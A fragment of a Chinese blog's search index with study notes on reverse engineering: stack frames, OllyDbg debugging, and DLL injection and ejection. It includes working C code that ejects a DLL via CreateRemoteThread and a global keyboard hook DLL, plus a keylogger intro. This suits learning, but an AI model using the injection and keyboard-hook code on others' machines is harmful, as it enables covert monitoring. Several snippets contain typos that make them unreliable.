指令指针寄存器指令指针寄存器保存着CPU要执行得指令地址，其大小为32位（4字节），由原16位IP寄存器扩展而来。程序运行时，CPU会读取EIP中一条指令得地址，传送指令到指令缓冲区后，EIP得值就会自动增加，增加得大小即为读取指令字节得大小。这样，CPU每执行完一条指令，就会通过EIP寄存器读取并执行下一条指令。 与通用寄存器不同，我们不可以直接修改EIP得值，只能通过其他指令间接修改，这些特定指令包括JMP、Jcc、CALL、RET。 通过中断或异常来修改EIP得值","link":"/2019/09/30/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86-32%E4%BD%8D%E5%AF%84%E5%AD%98%E5%99%A8/"},{"title":"逆向工程核心原理-DLL卸载","text":"DLL卸载是将强制插入进程的DLL弹出的一种技术，其工作原理与是以哦那个CreateRemoteThread API进行注入的原理类似 DLL卸载DLL卸载的工作原理CreateRemoteTHread API进行DLL注入的工作原理如下： 驱使目标进程调用LoadLibrary API 驱使目标进程调用FreeLibrary API 将FreeLibrary API的地址传递给CreateRemoteThread的IpStartAddress参数，并且将要卸载的DLL的句柄传递给IpStartAddress； 实现DLL卸载123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162// EjectDll.exe#include &quot;windows.h&quot;#include &quot;tlhelp32.h&quot;#include &quot;tchar.h&quot;#define DEF_PROC_NAME (L&quot;notepad.exe&quot;)#define DEF_DLL_NAME (L&quot;myhack.dll&quot;)DWORD FindProcessID(LPCTSTR szProcessName){ DWORD dwPID = 0xFFFFFFFF; HANDLE hSnapShot = INVALID_HANDLE_VALUE; PROCESSENTRY32 pe; // Get the snapshot of the system pe.dwSize = sizeof( PROCESSENTRY32 ); hSnapShot = CreateToolhelp32Snapshot( TH32CS_SNAPALL, NULL ); // find process Process32First(hSnapShot, &amp;pe); do { if(!_tcsicmp(szProcessName, (LPCTSTR)pe.szExeFile)) { dwPID = pe.th32ProcessID; break; } } while(Process32Next(hSnapShot, &amp;pe)); CloseHandle(hSnapShot); return dwPID;}BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) { TOKEN_PRIVILEGES tp; HANDLE hToken; LUID luid; if( !OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken) ) { _tprintf(L&quot;OpenProcessToken error: %u\\n&quot;, GetLastError()); return FALSE; } if( !LookupPrivilegeValue(NULL, // lookup privilege on local system lpszPrivilege, // privilege to lookup &amp;luid) ) // receives LUID of privilege { _tprintf(L&quot;LookupPrivilegeValue error: %u\\n&quot;, GetLastError() ); return FALSE; } tp.PrivilegeCount = 1; tp.Privileges[0].Luid = luid; if( bEnablePrivilege ) tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; else tp.Privileges[0].Attributes = 0; if( !AdjustTokenPrivileges(hToken, FALSE, &amp;tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES) NULL, (PDWORD) NULL) ) { _tprintf(L&quot;AdjustTokenPrivileges error: %u\\n&quot;, GetLastError() ); return FALSE; } if( GetLastError() == ERROR_NOT_ALL_ASSIGNED ) { _tprintf(L&quot;The token does not have the specified privilege. \\n&quot;); return FALSE; } return TRUE;}BOOL EjectDll(DWORD dwPID, LPCTSTR szDllName){ BOOL bMore = FALSE, bFound = FALSE; HANDLE hSnapshot, hProcess, hThread; HMODULE hModule = NULL; MODULEENTRY32 me = { sizeof(me) }; LPTHREAD_START_ROUTINE pThreadProc; //dwPID=notepad进程ID //使用TH32CS_SNAPMODULE参数，获取加载到Notepad进程的dll名称 hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPID); bMore = Module32First(hSnapshot, &amp;me); for( ; bMore ; bMore = Module32Next(hSnapshot, &amp;me) ) { if( !_tcsicmp((LPCTSTR)me.szModule, szDllName) || !_tcsicmp((LPCTSTR)me.szExePath, szDllName) ) { bFound = TRUE; break; } } if( !bFound ) { CloseHandle(hSnapshot); return FALSE; } if ( !(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)) ) { _tprintf(L&quot;OpenProcess(%d) failed!!! [%d]\\n&quot;, dwPID, GetLastError()); return FALSE; } hModule = GetModuleHandle(L&quot;kernel32.dll&quot;); pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hModule, &quot;FreeLibrary&quot;); hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, me.modBaseAddr, 0, NULL); WaitForSingleObject(hThread, INFINITE); CloseHandle(hThread); CloseHandle(hProcess); CloseHandle(hSnapshot); return TRUE;}int _tmain(int argc, TCHAR* argv[]){ DWORD dwPID = 0xFFFFFFFF; // 查找process dwPID = FindProcessID(DEF_PROC_NAME); if( dwPID == 0xFFFFFFFF ) { _tprintf(L&quot;There is no &lt;%s&gt; process!\\n&quot;, DEF_PROC_NAME); return 1; } _tprintf(L&quot;PID of \\&quot;%s\\&quot; is %d\\n&quot;, DEF_PROC_NAME, dwPID); // 更改 privilege if( !SetPrivilege(SE_DEBUG_NAME, TRUE) ) return 1; // eject dll if( EjectDll(dwPID, DEF_DLL_NAME) ) _tprintf(L&quot;EjectDll(%d, \\&quot;%s\\&quot;) success!!!\\n&quot;, dwPID, DEF_DLL_NAME); else _tprintf(L&quot;EjectDll(%d, \\&quot;%s\\&quot;) failed!!!\\n&quot;, dwPID, DEF_DLL_NAME); return 0;} 获取进程中加载的DLL信息1hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE,dwPID); 使用CreateToolhelp32Snapshot API可以获取加载到进程得DLL模块信息。将获取得hSnapshot句柄传递个Module32First()/Module32Next()函数后，即可设置于MODULEENTRY32结构体相关得模块信息 12345678910111213typedef struct tagMODULEENTRY32 { DWORD dwSize; //指定结构体长度 DWORD th32ModuleID; //此成员已经不再被使用，通常被设置为1 DWORD th32ProcessID; //正在检查得进程标识符 DWORD GlblcntUsage; //全局模块得使用计数 DWORD ProccntUsage; //全局模块得使用计数 BYTE *modBaseAddr; //模块得基地址，在其所属得进程范围内 DWORD modBaseSize; //模块得大小 HMODULE hModule; //模块句柄 TCHAR szModule[MAX_PATH]; //成员DLL得名称 TCHAR szExePath[MAX_PATH]; //终止得字符串，包含模块得位置或路径 DWORD dwFlags; //保留} MODULEENTRY32, *PMODULEENTRY32, *LPMODULEENTRY32; 获取目标句柄得句柄1hProcess = openProcess(PROCESS_ALL_ACCESS,FALSE,dwPID); 获取FreeLIbrary API地址12hModule = GetModuleHandle(L&quot;kernel32.dll&quot;);pThreadProc = (LPTHREAD_START_REUTINE)GetProcAddress(hModule,&quot;FreeLibreay&quot;); 在目标线程中运行线程1hThread = CreateRemoteThread(hProcee,NULL,0,pThreadProc,me.modBaseAddr,0,NULL); 123456789HANDLE WINAPI CreateRemoteThread( __in HANDLE hProcess, //线程所属进程得进程句柄 __in LPSECURITY_ATTRIBUTES lpThreadAttributes, //指向线程得安全属性 __in SIZE_T dwStackSize, //线程栈初始化大小 __in LPTHREAD_START_ROUTINE lpStartAddress, //在远程进程得地址中，该线程得线程函数起始地址 __in LPVOID lpParameter, //传递给线程函数得参数 __in DWORD dwCreationFlags, //线程得创建标志 __out LPDWORD lpThreadId //指向所属创建线程ID得指针，如果失败，则为NULL);","link":"/2019/11/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86-DLL%E5%8D%B8%E8%BD%BD/"},{"title":"逆向工程核心原理-DLL注入","text":"DLL注入是渗透其他进程最简单有效的办法，可以借助dll注入技术，实现钩取API、修改程序、修复bug等 DLL注入注入原理DLL注入指的是向运行中的其他进程强制插入特定的DLL文件，从技术细节说，DLL注入命令其他进程自行调用LoadLibrary()API，加载(Loading)用户指定的DLL文件。 DLL注入与一般DLL加载的区别在于，加载的目标进程是其自身或其他进程。 从图中看，MyHack.dll已经被强制插入Notepad.exe（notepad.exe并不会加载这个DLL）进程中，加载到Notepad.exe进程中的MyHack.dll与已经加载到Notepad.exe进程中的DLL一样，拥有放稳Notepad.exe进程内存的(正当)权限，这样用户就可以做任意想做的事情了 123456789101112131415161718BOOL WINAPI DllMain(HINSTANCE hinstDLL,DOWRD dwReason,LPVOID lpvReserved){ switch(dwReason) { case DLL_PROCESS_ATTACH: //添加想执行的代码 break; case DLL_THREAD_ATTACH: break; case DLL_THREAD_DEATCH: break; case DLL_PROCESS_DEATCH: break; }} DLL注入实例使用LoadLibrary()加载某个DLL时，该DLL中的DllMain函数就会被调用执行。DLL注入工作原理就是从外部促使目标进程调用LoadLibrary()这个API，所以回强制调用执行DLL的DllMain函数。并且，被注入的DLL拥有目标进程的放稳权限，用户可以随意操作。 改善功能与修复bugDLL注入技术可以用于改善功能与修复bug，没有程序对应的源码，或者直接修改程序比较困难的时候，就可以使用DLL注入来修改 消息钩取Windows OS默认提供校区钩取功能就是一种DLL注入技术。与常规的DLL注入唯一的不同是，OS回直接将已注册的钩子DLL注入目标进程； API钩取API钩取广泛用于实际的项目开发，而进行API钩取的时候通常使用DLL注入技术。先创建号DLL形态的钩取函数，再将其起送注入要钩取的目标进程，这样就完成了API钩取 恶意代码恶意代码的作者积极地把DLL注入到自己制作的恶意代码中，恶意代码的坐着通常将自己的代码隐藏到正常的进程(winlogon.exe、services.exe、svchost.exe、explorer.exe)等，打开后门端口，尝试外部链接等 DLL注入的方法远程现程注入(CreateRemoteThread) 使用注册表(AppInit_DLLs值) 消息钩取(SetWindowsHookEx) CreateRemoteThread","link":"/2019/10/31/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86-DLL%E6%B3%A8%E5%85%A5/"},{"title":"逆向工程核心原理-栈","text":"栈结构用途广泛，通常用于存储局部变量、传递函数参数、保存函数返回地址等 栈栈在进程中的作用如下： 暂时保存函数内部的局部变量 调用函数时传递参数 保存函数返回后的地址 栈是一种数据结构，它按照先进后出的结构存储数据 栈特征栈的示意图： 一个进程中，栈顶指针（ESP）初始状态指向栈底端。执行push命令将数据压入栈，栈顶指针就会上移到栈顶端。执行pop命令从栈中弹出数据时，如果栈为空，则栈顶指针重新移动到栈底端。 栈操作使用Ollydbg打开Stack.exe,可以看到当前的栈顶（ESP）和栈底（EBP） 可以看到ESP的值是0012FFC4 然后我们在调试中，让程序单步走，查看栈的状态 发现当前的栈顶编程0012FFC0，发现栈顶减去了4个字节，换言之，每次压栈，ESP的值减少4个字节，然后我们pop，然后发现ESP增加4个字节 栈定指针在初始状态下指向栈底","link":"/2019/10/10/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86-%E6%A0%88/"},{"title":"逆向工程核心原理-栈帧","text":"栈帧在程序中用于声明局部变量、调用函数 栈帧栈帧就是利用EBP寄存器访问栈内部变量、参数、函数返回地址等手段。ESP寄存器承担着栈顶指针的作用，而EBP寄存器负责行驶栈帧指针的只能。 123456push ebp; 函数开始，将ebp压入栈中mov ebp,esp;保存当前esp到ebp中 ;函数执行，无论ESP如何变化，EBP不会变化，可以安全访问函数的局部变量、参数mov esp,ebp;将函数的起始地址返回到ESP中pop ebp ;函数返回前弹出保存在栈中的EBP数据retn ;函数结束 调试实例1234567891011121314151617#include &quot;stdio.h&quot;long add(long a, long b){ long x = a, y = b; return (x + y);}int main(int argc, char* argv[]){ long a = 1, b = 2; printf(&quot;%d\\n&quot;, add(a, b)); return 0;} 为了更好的使用栈帧，请关闭Visual C++的优化选项（/Od）后再进行编译 使用OD打开编译后的文件，然后使用CTRL + G命令（Go to命令），转到00401000地址处，然后查看 main函数生成栈帧首先我们定位main函数，我们把VC6查看 将程序载入OD，查看一下 12345678910111213141516171819202100401020 /$ 55 push ebp ;#main（）00401021 |. 8BEC mov ebp,esp00401023 |. 83EC 08 sub esp,0x800401026 |. C745 FC 01000&gt;mov [local.1],0x10040102D |. C745 F8 02000&gt;mov [local.2],0x200401034 |. 8B45 F8 mov eax,[local.2]00401037 |. 50 push eax00401038 |. 8B4D FC mov ecx,[local.1]0040103B |. 51 push ecx0040103C |. E8 BFFFFFFF call StackFra.00401000 ;函数调用00401041 |. 83C4 08 add esp,0x800401044 |. 50 push eax00401045 |. 68 84B34000 push StackFra.0040B384 ; ASCII &quot;%d\\n&quot;0040104A |. E8 18000000 call StackFra.004010670040104F |. 83C4 08 add esp,0x800401052 |. 33C0 xor eax,eax00401054 |. 8BE5 mov esp,ebp00401056 |. 5D pop ebp ; StackFra.0040125000401057 \\. C3 retn 这里就是main函数的主体，然后我们在中间看到了0040103C有call语句，我们下断点跟踪，发现它进入一个上一个函数体，对照源代码，00401000这里就是我们的add函数 设置局部变量12345678910111213141516171800401000 /$ 55 push ebp00401001 |. 8BEC mov ebp,esp00401003 &gt; 83EC 08 sub esp,0x8 ; 开辟变量的存储空间00401006 |. 8B45 08 mov eax,[arg.1]00401009 |. 8945 F8 mov [local.2],eax0040100C |. 8B4D 0C mov ecx,[arg.2]0040100F |. 894D FC mov [local.1],ecx ;赋值语句00401012 |. 8B45 F8 mov eax,[local.2]00401015 |. 0345 FC add eax,[local.1] ; StackFra.0040255000401018 |. 8BE5 mov esp,ebp0040101A |. 5D pop ebp ; 0012FFB00040101B \\. C3 retn0040101C CC int30040101D CC int30040101E CC int30040101F CC int3 函数参数传递与调用123456700401026 |. C745 FC 01000&gt;mov [local.1],0x10040102D |. C745 F8 02000&gt;mov [local.2],0x200401034 |. 8B45 F8 mov eax,[local.2]00401037 |. 50 push eax00401038 |. 8B4D FC mov ecx,[local.1]0040103B |. 51 push ecx0040103C |. E8 BFFFFFFF call StackFra.00401000 ; 函数跳转 依此将变量的数值压入栈，然后进行函数调用，注意，这里的参数传递与C语言相反，换言之，变量B先出栈，变量A后出栈 执行完毕以后，CPU会把当前函数的返回地址压入栈，用作函数执行完毕后的返回地址，在地址00401030C处调用了ADD函数，它的命令下一条地址是00401041。 函数体执行生成栈帧1200401000 /$ 55 push ebp ;将EBP（main函数的基址指针保存进入栈）00401001 |. 8BEC mov ebp,esp;将esp存入ebp main函数的EBP被保存进入栈中，然后EBP的值被重新设定 设置局部变量1234500401003 &gt; 83EC 08 sub esp,0x8 ; 设置变量空间00401006 |. 8B45 08 mov eax,[arg.1]00401009 |. 8945 F8 mov [local.2],eax0040100C |. 8B4D 0C mov ecx,[arg.2]0040100F |. 894D FC mov [local.1],ecx 运算1200401012 |. 8B45 F8 mov eax,[local.2]00401015 |. 0345 FC add eax,[local.1] ; StackFra.00402550 删除栈帧并返回12300401018 |. 8BE5 mov esp,ebp ;将ebp的值传递给esp，与地址00401001处mov ebp，0040101A |. 5D pop ebp ;将栈中保存的数值弹出 ; 0012FFB00040101B \\. C3 retn ;存储在栈中地址被返回 从栈中删除函数的参数123450040103C |. E8 BFFFFFFF call StackFra.00401000 ; 函数跳转00401041 |. 83C4 08 add esp,0x8 ;删除栈中数据00401044 |. 50 push eax 调用printf函数123400401044 |. 50 push eax ；调用add函数返回值00401045 |. 68 84B34000 push StackFra.0040B384 ; ASCII &quot;%d\\n&quot; 0040104A |. E8 18000000 call StackFra.00401067 ;printf()0040104F |. 83C4 08 add esp,0x8 设置返回值123400401052 |. 33C0 xor eax,eax00401054 |. 8BE5 mov esp,ebp00401056 |. 5D pop ebp ; 0012FFB000401057 \\. C3 retn XOR命令用来通过异或运算，其特点为两个相同的值进行异或，结果为0 删除栈帧函数终止12300401054 |. 8BE5 mov esp,ebp00401056 |. 5D pop ebp ; 0012FFB000401057 \\. C3 retn 执行完毕后，函数栈帧被删除，函数结果 完整的汇编代码： 123456789101112131415161718192021222324252627282930313233343500401000 /$ 55 push ebp ; 将上一个函数的ebp压入栈00401001 |. 8BEC mov ebp,esp ; 设置备份00401003 &gt; 83EC 08 sub esp,0x8 ; 设置变量空间00401006 |. 8B45 08 mov eax,[arg.1]00401009 |. 8945 F8 mov [local.2],eax0040100C |. 8B4D 0C mov ecx,[arg.2]0040100F |. 894D FC mov [local.1],ecx ; 赋值00401012 |. 8B45 F8 mov eax,[local.2]00401015 |. 0345 FC add eax,[local.1] ; 做加法00401018 |. 8BE5 mov esp,ebp ; 找到上一次的ebp送入esp中0040101A |. 5D pop ebp ; 0012FFB00040101B \\. C3 retn ; 函数结束0040101C CC int30040101D CC int30040101E CC int30040101F CC int300401020 /$ 55 push ebp00401021 |. 8BEC mov ebp,esp00401023 |. 83EC 08 sub esp,0x800401026 |. C745 FC 01000&gt;mov [local.1],0x10040102D |. C745 F8 02000&gt;mov [local.2],0x200401034 |. 8B45 F8 mov eax,[local.2]00401037 |. 50 push eax00401038 |. 8B4D FC mov ecx,[local.1] ; StackFra.004025500040103B |. 51 push ecx0040103C |. E8 BFFFFFFF call StackFra.00401000 ; 函数跳转00401041 |. 83C4 08 add esp,0x800401044 |. 50 push eax00401045 |. 68 84B34000 push StackFra.0040B384 ; ASCII &quot;%d\\n&quot;0040104A |. E8 18000000 call StackFra.004010670040104F |. 83C4 08 add esp,0x800401052 |. 33C0 xor eax,eax00401054 |. 8BE5 mov esp,ebp00401056 |. 5D pop ebp ; 0012FFB000401057 \\. C3 retn","link":"/2019/10/10/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86-%E6%A0%88%E5%B8%A7/"},{"title":"逆向工程核心原理-消息钩子","text":"消息钩子 钩子HOOK为了偷看或截取来往信息而在中间设置岗哨的行为称为”挂钩”，实际上，偷看或操作信息的行为就是人家常说的“钩取”(Hooking)； 消息钩子Windows面向用户提供GUI，它以时间驱动方式工作。在操作系统中借助鼠标、键盘、选择菜单、按钮以及拖动鼠标、改变窗口大小与位置的都是时间。 Windows消息流： 发生键盘输入时间的时候，WM_KEYDOWN消息被添加进入系统消息队列(OS Message queue) 操作系统判断哪个程序中发生了时间，然后从系统消息队列中取出消息，添加到相应应用程序的(application message queue)中 应用程序监视自身的消息队列，发现新添加的VM_KEYDOWN消息后，调用相应的事件处理程序处理 SetWindowsHookEx使用SetWindowsHookEx APi可以轻松实现消息钩子，API的定义如下： 12345678HHOOK WINAPI SetWindowsHookEx( _In_ int idHook, //hook类型 _In_ HOOKPROC lpfn, //hook回调函数地址 _In_ HINSTANCE hMod, //钩子程序所属的DLL句柄 _In_ DWORD dwThreadId //想要挂钩的现程的ID); 钩子过程是由操作系统调用的回调函数。 键盘消息钩取 代码实现12345678910111213141516171819202122232425262728293031323334353637383940414243/*HookMain.cpp*/#include &quot;stdio.h&quot;#include &quot;conio.h&quot;#include &quot;windows.h&quot;#define DEF_DLL_NAME &quot;KeyHook.dll&quot; //dll的名称#define DEF_HOOKSTART &quot;HookStart&quot; //启动dll名称#define DEF_HOOKSTOP &quot;HookStop&quot; //暂停dll名称typedef void (*PFN_HOOKSTART)(); //typedef void (*PFN_HOOKSTOP)();void main(){ HMODULE hDll = NULL; //载入的模块句柄 PFN_HOOKSTART HookStart = NULL; //函数指针hook_start PFN_HOOKSTOP HookStop = NULL; char ch = 0; //字符串 hDll = LoadLibraryA(DEF_DLL_NAME); //模块句柄载入一个dll if( hDll == NULL ) //判断是否载入成功 { printf(&quot;LoadLibrary(%s) failed!!! [%d]&quot;, DEF_DLL_NAME, GetLastError()); return; //如果载入失败的流程 } HookStart = (PFN_HOOKSTART)GetProcAddress(hDll, DEF_HOOKSTART); //GetProceAddress是检索指定的动态链接库中的输出库函数地址 HookStop = (PFN_HOOKSTOP)GetProcAddress(hDll, DEF_HOOKSTOP); HookStart(); //进入载入模块的函数 printf(&quot;press 'q' to quit!\\n&quot;); while( _getch() != 'q' ) ; //如果输入的字符不等于q的时候,不退出 HookStop(); //hook停止 FreeLibrary(hDll); //释放载入的DLL} 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102/*KeyHook.cpp*/#include &lt;stdio.h&gt;#include &lt;Windows.h&gt;#define DEF_PROCESS_NAME &quot;notepad.exe&quot;HINSTANCE g_hInstance = NULL; //句柄类型HHOOK g_hHook = NULL; //HWND g_hWnd = NULL; //窗口句柄BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD dwReason,LPVOID lpvReserved){ //HINSTANCE hinstDLL // 指向自身的句柄 //DWORD fdwReason // 调用原因 //LPVOID lpvReserved // 隐式加载和显式加载 switch(dwReason) { case DLL_PROCESS_ATTACH: //当一个DLL文件被映射到进程地址空间的时候,系统调用该DLL的DllMain函数,传递的dwReason参数调用DLL_PROCESS_ATTACH,这种调用会发生在第一次映射时. { g_hInstance = hinstDLL; //将指向自身的句柄传递给创建的句柄类型 break; } case DLL_PROCESS_DETACH: { break; } } return TRUE;}LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam){ //KeyboardProc是键盘钩子处理函数 //nCode如果小于0,则必须让KeyboardProc函数返回CallNextHookEx //wParam按键虚拟键值消息 //lParam扩展键值,扫描码,上下文,重复次数 char szPath[MAX_PATH] = {0,}; //char类型的数组,MAX_PATH在VC6中的值是260 char *p = NULL; //字符类型指针 if( nCode &gt;= 0 ) //如果有按键按下 { if( !(lParam &amp; 0x80000000) ) //释放键盘按键时 { GetModuleFileNameA(NULL, szPath, MAX_PATH); //获取当前运行程序的决定路径 /* DWORD WINAPI GetModuleFileName( _In_opt_ HMODULE hModule, //指向一个模块的句柄,可以是一个DLL模块,或者是一个应用程序的实例句柄.如果为null,该函数则返回该应用程序的全路径 _Out_ LPTSTR lpFilename, //指向一个字符缓冲区,要在其中容纳文件的用NULL字符终止的路径名,hModule模块就是从这个文件装载进来的 _In_ DWORD nSize //装载到缓冲区的最大字符数量 ); */ p = strrchr(szPath, '\\\\'); //strrchr函数查找字符在指定字符串中从后面开始的第一次出现的位置 if( !_stricmp(p + 1, DEF_PROCESS_NAME) ) //stricmp比较字符串数组的一个函数,不可以区别大小写 return 1; } } return CallNextHookEx(g_hHook, nCode, wParam, lParam); /*CallNextHookEx( hhk: HHOOK; {当前钩子的句柄} nCode: Integer; {钩子代码; 就是给下一个钩子要交待的} wParam: WPARAM; {要传递的参数; 由钩子类型决定是什么参数} lParam: LPARAM {要传递的参数; 由钩子类型决定是什么参数}): LRESULT; {会返回下一个钩子执行后的返回值; 0 表示失败}//参数 nCode 的可选值:HC_ACTION = 0; {}HC_GETNEXT = 1; {}HC_SKIP = 2; {}HC_NOREMOVE = 3; {}HC_NOREM = HC_NOREMOVE; {}HC_SYSMODALON = 4; {}HC_SYSMODALOFF = 5; {} */}#ifdef __cplusplusextern &quot;C&quot; {#endif __declspec(dllexport) void HookStart() { g_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hInstance, 0); } __declspec(dllexport) void HookStop() { if( g_hHook ) { UnhookWindowsHookEx(g_hHook); g_hHook = NULL; } }#ifdef __cplusplus}#endif//KeyHook生成DLL 调试练习检索API程序载入OD-&gt;搜索字符串-&gt;查看字符串 从图中可以看到，004010C4地址处的指令引用了要查找的字符串。然后转到地址处； 调试main函数 在00401010处设置断点，然后运行程序，到断点处停下来，开始调试。从断点开始一次跟踪调试戴拿，可以了解main函数中的主要代码流。 先在00401048地址处调用LoadLibrary(KeyHool.dll)，然后由00401084地址处CALL指令调用KeyHook.HookStart函数。","link":"/2019/10/31/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86-%E6%B6%88%E6%81%AF%E9%92%A9%E5%AD%90/"},{"title":"逆向工程核心原理-逆向Hello程序","text":"通过调试Hello World来学习Ollydbg调试器 Hello程序 程序源代码： 12345678#include &lt;stdio.h&gt;#include &lt;Windows.h&gt;#include &lt;tchar.h&gt;int _tmain(){ MessageBox(NULL,&quot;Hello World&quot;,&quot;sYstem1kt&quot;,MB_OK); return 0;} 然后进行编译链接，选择Release模式进行生成 使用Ollydbg调试Ollydbg简介将程序拖入Ollydbg中 代码窗口：默认用于显示反汇编代码，还显示各种标签、注释、分析代码时显示循环、跳转等信息 寄存器窗口：实时显示CPU寄存器得值，可用于修改特定得寄存器 以HEX/ASCII/Unicode值得形式显示进程得内存地址，也可在这里修改内存地址 实时显示ESP寄存器指向得进程栈内存，并允许修改 入口点将程序载入调试器后停止得地方即为Hello程序得起始地址 1234567891011121314151600401020 &gt;/$ 55 push ebp00401021 |. 8BEC mov ebp,esp00401023 |. 6A FF push -0x100401025 |. 68 98404000 push Hello.004040980040102A |. 68 E81A4000 push Hello.00401AE8 ; SE 处理程序安装0040102F |. 64:A1 0000000&gt;mov eax,dword ptr fs:[0]00401035 |. 50 push eax00401036 |. 64:8925 00000&gt;mov dword ptr fs:[0],esp0040103D |. 83EC 10 sub esp,0x1000401040 |. 53 push ebx00401041 |. 56 push esi00401042 |. 57 push edi00401043 |. 8965 E8 mov [local.6],esp00401046 |. FF15 0C404000 call dword ptr ds:[&lt;&amp;KERNEL32.GetVersion&gt;; kernel32.GetVersion0040104C |. 33D2 xor edx,edx ; ntdll.KiFastSystemCallRet0040104E |. 8AD4 mov dl,ah 跟踪函数指令 快捷键 含义 Restart Ctrl+F2 重新开始调试（终止当前得进程后再次运行） Step Into F7 执行一句，遇到调用命令(call)，进入函数代码内部 Step Over F8 执行一句，遇到调用命令(call)，仅执行函数本身，不跟随进入函数内部 Execute till Returm Ctrl+F9 一直在函数内部运行，直到遇到Retn命令，跳出函数 熟悉调试器调试器指令 断点 Goto命令 使用Goto命令，然后输入一个表达式（地址），然后点击ok，光标会自动定位到这个地址处，然后执行到光标位置（F4），让调试流到达该处，然后继续执行 断点 使用F2可以快速得下断点，然后使用断点查看快捷键（ALT+B），列出代码中设置得断点 注释 键盘上得“；”可以在指定地址处添加注释，还可以通过命令找到 标签 键盘上得“：”可以在执行地址处添加标签 快速找到指定代码得方法代码执行法我们可以不停得F8，从程序得入口开始，直到什么时候弹出Hello得窗口，然后记住这个地址，这个地址所对应得函数就是main函数 我们去查看一下00401000得内容 字符串检索我使用得52pojie得Ollydbg，查找字符串得方法有很多，通常使用Search for-&gt; All referenced strings 然后再数据窗口中打开 API检索法:在调用代码中设置断点鼠标右键-&gt;Search for -&gt; All intermodular calls API检索法:在API代码中设置断点鼠标右键-&gt;Search for -&gt; Name in all calls 然后打开内存窗口，查看内存 然后我们可以知道MessageBox使用得是user32.dll这个库，然后我们去查看这个库 进入这个函数库得调用，下断点，然后让程序跑到这里，查看ESP 然后我们去ESP指向得地址查看进程栈得地址 在上图中我们可以看到，所有得地址都出来了 修改字符串修改缓冲区我们可以直接修改buffer这个缓冲区得内容，也可以直接更粗暴一些，修改它在内存中得指向 修改一下 修换缓冲区同理，修改内存中得字符 在其他内存区域创建新字符传递给函数消息找一块空白得内存空间，在这块空间中写入你想要显示得字符，然后修改汇编指令","link":"/2019/09/30/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86-%E9%80%86%E5%90%91Hello%E7%A8%8B%E5%BA%8F/"},{"title":"逆向工程核心原理-键盘记录器","text":"不能说(经用户同意)应用在管理中的键盘记录器(Key_Logger)一定是坏的，问题是那些用户不知情的、处于恶意运行的键盘记录器 键盘记录器恶意键盘记录器的目标键盘记录器的基本功能就是记录并保存用户在键盘上输入的信息，然后将这些信息转移到指定的地址；","link":"/2019/10/31/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86-%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E5%99%A8/"},{"title":"黑客编程-入门","text":"我们一直在使用别人开发得工具尝试“入侵”，俗称脚本小子，但是WIndows是一个庞大而复杂得操作系统，它提供了强大而丰富得功能，不但操作灵活方便，而且有众多软件支持，我们需要了解Windows下得开发工具、辅助工具、调试工具 Windows消息大部分Windows应用程序基于消息机制得(命令行下得程序不急于消息机制)，熟悉Windows操作系统得消息机制掌握Windows操作系统下编程得基础； 消息的演示测试123456789101112131415161718192021222324252627282930313233343536373839404142434445void CMsgTestDlg::OnClose(){ HWND hWnd = ::FindWindow(&quot;notepad&quot;,NULL); if(hWnd == NULL) { AfxMessageBox(&quot;没有找到记事本&quot;); return ; } ::SendMessage(hWnd,WN_CLOSE,NULL,NULL);}void CMsgTestDlg::OnExec(){ WinExec(&quot;notepad.exe&quot;,SW_SHOW);}void CMsgTestDlg::OnEditWnd(){ HWND hWnd = ::FindWindow(NULL,&quot;无标题-记事本&quot;); if(hWnd == NULL) { AfxMessageBox(&quot;没有找到记事本&quot;); return ; } char *pCaptionText = &quot;消息测试&quot;; ::SendMessage(hWnd,WM_SETTEXT,(WPARAM)0,(LPARAM),pCaptionText);}void CMsgTestDlg::OnGetWNd(){ HNWD hWnd = ::FindWindow(&quot;notepad&quot;,NULL); if(hWnd == NULL) { AfxMessageBox(&quot;没有找到记事本&quot;); return ; } char *pCaptionText = &quot;消息测试&quot;; ::SendMessage(hWnd,WM_SETTEXT,(WPARAM)MAXBYTE,(LPARAM),pCaptionText); AfxMessageBox(pCaptionText);} 对MsgTest代码解释两个主要API函数，FindWindow、SendMessage函数 1234HWND FindWindow( LPCTSTR lpClassName, //窗口类名（标题） LPCTSTR lpWindowName //窗口名称); 123456LRESULT SendMessage( HWND hWnd, //窗口句柄 UINT Msg, //消息类型 WPARAM wParam, //附加参数 LPARAM lParam //附加参数); 获取窗口的类名称使用SPY++来获取窗口的类名称 